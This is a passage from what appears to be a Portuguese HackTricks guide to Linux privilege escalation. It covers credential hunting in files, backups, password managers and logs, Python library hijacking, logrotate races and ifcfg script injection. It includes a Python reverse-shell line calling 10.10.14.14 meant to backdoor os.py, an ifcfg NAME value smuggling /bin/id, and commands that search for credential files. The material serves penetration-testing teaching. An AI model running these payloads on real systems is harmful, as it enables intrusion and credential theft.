for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Arquivos modificados nos últimos minutos

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Arquivos de banco de dados SQLite

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

Em bancos de dados de aplicativos legíveis, inspecione os nomes das tabelas e colunas em busca de nomes de usuário e hashes de senha. Encontrar um hash, recuperar a senha correspondente e comprovar que ela é reutilizada em uma conta local são etapas distintas; uma sequência hexadecimal genérica de 32 caracteres não basta para deduzir que se trata de MD5 ou que há acesso à conta.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Se um histórico do shell legível contiver um comando `sudo` seguido por uma linha curta, parecida com uma senha, inspecione manualmente as linhas ao redor. Uma senha digitada no prompt normal do `sudo` não é salva no histórico do shell; uma linha seguinte é apenas uma possível entrada acidental no shell, não uma prova de que a senha é válida. O marcador `.sudo_as_admin_successful` registra um uso anterior, não a autorização atual.

### Arquivos ocultos

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Scripts/Binários no PATH**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Arquivos da Web**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Backups**

Inspecione arquivos legíveis dentro de diretórios de backup, bem como arquivos cujos **nomes** contenham `backup`: um arquivo compactado com nome opaco ou extensão criptografada ainda pode expor dados antigos de aplicativos. Um arquivo compactado criptografado é apenas um candidato a exposição. A recuperação da senha, a inspeção do conteúdo, a recuperação de um hash de aplicativo e a reutilização dessa senha para uma conta Unix são etapas distintas que precisam ser verificadas; um hash em um arquivo compactado não comprova um login local.

Backups legíveis de máquinas virtuais merecem a mesma análise. Uma configuração `.vbox` do VirtualBox pode identificar imagens `.vdi` anexadas e conter metadados de chave de disco criptografada; [a documentação do VirtualBox informa que a chave de dados criptografada é armazenada na configuração da VM](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Tanto a configuração quanto a imagem precisam estar acessíveis para que seja possível analisar o disco offline. Um volume do sistema convidado pode ter sua própria [camada de criptografia LUKS](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), exigindo uma chave separada. Mesmo após a descriptografia autorizada, scripts ou configurações antigos podem conter uma senha; confirme que a credencial ainda é válida para uma conta do host e que a política `sudo` efetiva permite executar um comando privilegiado antes de classificar isso como uma escalada local. Durante a enumeração passiva, inventarie os caminhos e as permissões sem copiar, descriptografar ou montar imagens.

Ao inspecionar um arquivo compactado legível, liste os nomes dos arquivos contidos antes de extrair qualquer coisa: arquivos de autenticador ocultos, material de códigos de recuperação ou chaves SSH podem estar presentes mesmo que as cópias ativas estejam protegidas. Os nomes dos arquivos apenas indicam uma possível pista; verifique o material e qualquer reutilização de conta separadamente.

Dê prioridade a **arquivos compactados legíveis pertencentes a outro usuário** em diretórios de backup, especialmente arquivos pertencentes ao root e aqueles acessíveis por associação a grupos. Um arquivo antigo pode conter uma configuração ou um segredo de autenticação, mesmo quando a cópia ativa está protegida. Para uma interface local de backup, como [Backrest](https://garethgeorge.github.io/backrest/), verifique a conta efetiva do serviço e se um usuário com menos privilégios pode ler sua configuração ou se autenticar na interface. Seus [hooks](https://garethgeorge.github.io/backrest/docs/hooks) e [interface de comandos restic](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) podem operar com os privilégios de arquivo e de comando do daemon; um listener em loopback, por si só, não determina o impacto. O `passwordBcrypt` do Backrest é um hash bcrypt codificado em base64 no seu [código de autenticação](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), não uma senha em texto simples. Confirme a identidade do serviço, a validade das credenciais e o acesso ao plano ou repositório relevante antes de tratar um arquivo compactado ou uma interface expostos como uma fronteira de privilégios.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Arquivos conhecidos que contêm senhas

Leia o código do [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS): ele procura **vários arquivos possíveis que podem conter senhas**.\
**Outra ferramenta interessante** que você pode usar para isso é o [**LaZagne**](https://github.com/AlessandroZ/LaZagne), um aplicativo de código aberto usado para recuperar várias senhas armazenadas em um computador local com Windows, Linux ou Mac.

Se `/etc/guacamole/guacamole.properties` puder ser lido, revise as configurações de conexão com bancos de dados `mysql-*`, `postgresql-*` ou `sqlserver-*`. Se a conta tiver autorização para ler as tabelas JDBC do Guacamole, `guacamole_connection_parameter` pode conter valores salvos de `username`, `password`, `private-key` ou `passphrase` para SSH. Comece pelos IDs das conexões e pelos nomes dos parâmetros e, em seguida, inspecione apenas as linhas relevantes; um valor salvo pode ser um token dinâmico ou uma referência a um cofre, e não um segredo reutilizável. Consulte o [esquema JDBC do Guacamole](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) e os [parâmetros de conexão SSH](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

O [gerenciador de senhas pswm](https://github.com/Julynx/pswm#usage) armazena um cofre criptografado em `~/.local/share/pswm/pswm` por padrão. Se o cofre de outro usuário estiver visível, verifique sua propriedade e se sua conta realmente consegue lê-lo. O caminho do cofre, por si só, não revela credenciais; recuperar a senha mestra, encontrar uma senha de conta reutilizável e confirmar os privilégios dessa conta são etapas distintas.

O [banco de dados padrão do Passpie](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) fica em `~/.passpie/`, com um chaveiro `.keys` e arquivos de credenciais `.pass` criptografados nos diretórios de grupos. Um diretório de banco de dados visível é apenas uma pista de caminho: confirme o acesso à chave e à entrada criptografada relevante, qualquer frase-senha mestra necessária e se a credencial recuperada pertence a uma conta com mais privilégios. O Passpie também aceita [caminhos personalizados para bancos de dados](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), portanto o caminho padrão não abrange todos os casos. A enumeração automatizada deve listar metadados sem exportar credenciais nem exibir material de chaves.

### Logs

Se você puder ler os logs, talvez encontre **informações interessantes/confidenciais neles**. Quanto mais estranho for o log, mais interessante ele será (provavelmente).\
Além disso, alguns **logs de auditoria** configurados de forma “ruim” (com backdoor?) podem permitir **registrar senhas** nos logs de auditoria, conforme explicado nesta publicação: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Para **ler logs, o grupo** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) **será muito útil**.

### Arquivos de shell

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Busca genérica de credenciais/Regex

Você também deve procurar arquivos que contenham a palavra "**password**" no **nome** ou no conteúdo, além de procurar IPs, emails e expressões regulares de hashes nos logs.\
Não vou listar aqui como fazer tudo isso, mas, se tiver interesse, você pode conferir as últimas verificações realizadas pelo [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Arquivos graváveis

### Python library hijacking

Se você souber **onde** um script Python será executado e **puder gravar nesse** diretório ou modificar bibliotecas Python, poderá modificar a biblioteca do sistema operacional e inserir um backdoor nela (se puder gravar no diretório onde o script Python será executado, copie e cole a biblioteca os.py).

Para inserir um **backdoor na biblioteca**, basta adicionar a seguinte linha ao final da biblioteca os.py (altere IP e PORT):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

### Exploração de logrotate

Uma tarefa privilegiada do `logrotate` pode criar um caminho para gravação de arquivos entre usuários quando realmente rotaciona um log localizado abaixo de um diretório que um usuário com menos privilégios pode substituir ou redirecionar durante a rotação. Um log gravável, por si só, é apenas uma pista. Confirme a regra ativa exata e suas diretivas `create`, `olddir` e `su`; a identidade efetiva do agendador; as permissões de gravação e busca no diretório pai do log; e se a versão instalada e a política permitem a alteração do destino. Para que a gravação em um arquivo de inicialização resulte na execução de comandos, um shell privilegiado iniciado posteriormente também precisa carregar o arquivo resultante. Inspecione o agendamento, a regra, a versão e o empacotamento, bem como os metadados dos caminhos, sem acionar uma rotação nem tentar a corrida.

> [!TIP]
> Não considere `3.18.0` nem qualquer string de versão, isoladamente, como um limite de explorabilidade. O [registro de alterações do upstream](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) documenta medidas de proteção contra problemas com diretórios e links simbólicos em várias versões, e as distribuições podem aplicar correções retroativamente. O [manual do upstream](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) recomenda `su` quando o root rotaciona logs em diretórios controlados por usuários sem privilégios; verifique a regra efetiva e o comportamento real.

Informações mais detalhadas sobre a vulnerabilidade podem ser encontradas nesta página: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Você pode explorar esta vulnerabilidade com [**logrotten**](https://github.com/whotwagner/logrotten).

Esta vulnerabilidade é muito semelhante a [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(logs do nginx)**. Portanto, sempre que descobrir que pode alterar logs, verifique quem os gerencia e se é possível escalar privilégios substituindo-os por links simbólicos.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referência da vulnerabilidade:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Um arquivo `ifcfg-*` é uma pista para investigação quando um usuário com menos privilégios pode criá-lo ou alterá-lo **e** um caminho privilegiado de ativação de rede lerá exatamente esse arquivo. Confirme as permissões efetivas do arquivo e do diretório, a interface selecionada, a implementação instalada de `ifup`/`ifdown` e quem a invoca. Um arquivo gravável, por si só, não causa execução. O [guia de rede do RHEL 7 da Red Hat](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) diferencia os scripts de rede legados do NetworkManager: este último não aciona os primeiros por si só. A [documentação do RHEL 8](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) informa que, por padrão, `ifup`/`ifdown` usam o NetworkManager, enquanto o pacote legado opcional fornece scripts de shell.

Em um sistema que realmente usa scripts legados privilegiados, uma atribuição `ifcfg-*` sem aspas e interpretada como código pelo shell, como `NAME=`, pode cruzar uma fronteira de execução de código. Verifique o parser exato, o valor e o caminho de ativação; não presuma que haverá interpretação pelo shell apenas com base no nome do arquivo ou na presença do NetworkManager. Um wrapper permitido pelo sudo que grava a entrada do usuário em um arquivo `ifcfg-*` e, em seguida, chama o `ifup` legado é outro caminho para essa fronteira, mesmo quando o usuário não pode editar diretamente o arquivo.

Por exemplo: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Observe o espaço em branco entre Network e /bin/id_)

### **init, init.d, systemd e rc.d**

O diretório `/etc/init.d` abriga **scripts** do System V init (SysVinit), o **sistema clássico de gerenciamento de serviços do Linux**. Ele inclui scripts para `start`, `stop`, `restart` e, às vezes, `reload` de serviços. Eles podem ser executados diretamente ou por meio de links simbólicos encontrados em `/etc/rc?.d/`. Nos sistemas Redhat, um caminho alternativo é `/etc/rc.d/init.d`.

Por outro lado, `/etc/init` está associado ao **Upstart**, um sistema mais recente de **gerenciamento de serviços** introduzido pelo Ubuntu, que usa arquivos de configuração para tarefas de gerenciamento de serviços. Apesar da transição para o Upstart, os scripts do SysVinit ainda são usados junto com as configurações do Upstart, graças a uma camada de compatibilidade do Upstart.

O **systemd** é um gerenciador moderno de inicialização e serviços, que oferece recursos avançados como inicialização de daemons sob demanda, gerenciamento de montagem automática e snapshots do estado do sistema. Ele organiza os arquivos em `/usr/lib/systemd/` para pacotes da distribuição e em `/etc/systemd/system/` para alterações feitas pelo administrador, simplificando o processo de administração do sistema.<sup>[[21]](#references)</sup>

## Outros truques

### Escalação de privilégios via NFS


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escapando de shells restritos


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Frameworks de rooting do Android: abuso do canal de comunicação com o gerenciador

Frameworks de rooting do Android geralmente interceptam uma syscall para expor funcionalidades privilegiadas do kernel a um gerenciador no espaço de usuário. Uma autenticação fraca do gerenciador (por exemplo, verificações de assinatura baseadas na ordem dos FD ou esquemas de senha fracos) pode permitir que um app local se passe pelo gerenciador e obtenha root em dispositivos já rooteados. Saiba mais e veja os detalhes da exploração aqui:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## LPE por descoberta de serviços do VMware Tools (CWE-426) via execução baseada em regex (CVE-2025-41244)

A descoberta de serviços baseada em regex no VMware Tools/Aria Operations pode extrair um caminho de binário das linhas de comando dos processos e executá-lo com -v em um contexto privilegiado. Padrões permissivos (por exemplo, que usam \S) podem corresponder a listeners preparados pelo atacante em locais graváveis (por exemplo, /tmp/httpd), levando à execução como root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Saiba mais e veja aqui um padrão generalizado aplicável a outras pilhas de descoberta/monitoramento:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Proteções de segurança do kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Mais ajuda

[Binaries estáticos do impacket](https://github.com/ropnop/impacket_static_binaries)

## Ferramentas de Privesc para Linux/Unix

### **Melhor ferramenta para procurar vetores de escalada local de privilégios no Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(opção -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumera vulnerabilidades do kernel em Linux e MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (acesso físico):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Coletânea de mais scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (escalada de privilégios pela interface do Crontab, reutilização de credenciais com zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: payload .text_sig forjado para monitor executado pelo cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: desvio do Neighborhood Watch (sequestro de PATH via sudo env_keep)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Escalada básica de privilégios no Linux](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Guia de escalada de privilégios no Linux](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Ataque e defesa: técnicas de escalada de privilégios no Linux de 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Ninguém espera execução de comandos!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (escalada de privilégios no Linux)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – passo a passo dos exercícios de laboratório - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: dicas e truques para escalada de privilégios no Linux](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: ferramenta de enumeração e escalada de privilégios no Linux](https://github.com/rtcrowley/linux-private-i)
- [14] [O que é um socket?](https://www.linux.com/news/what-socket/)
- [15] [Writeup de Peppo (Proving Grounds)](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Conheça o D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [Escalada de privilégios no Linux por executáveis SUID](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Parte 2 – escalada de privilégios no Linux](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Como gerenciar ACLs no Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Root em Redhat/CentOS por meio de network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [O que é systemd?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (injeção aritmética no bash via logs, cadeia completa)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [Manual do GNU Bash – BASH_ENV (arquivo de inicialização não interativo)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + escalada de privilégios via symlink de TF_VAR)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (cópia do pg_basebackup pelo cron → bash SUID)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Você escolhe o nome, VMware o eleva (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: escalada de privilégios do Sudo por chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – vulnerabilidades de escalada de privilégios no Sudo CVE-2025-32462 e CVE-2025-32463](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – diretórios de repositório PYC](https://peps.python.org/pep-3147/)
- [32] [Documentação do Python importlib](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet de @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - registrando senhas no Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - detalhes de uma condição de corrida do logrotate](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
{{#include ../../../banners/hacktricks-training.md}}
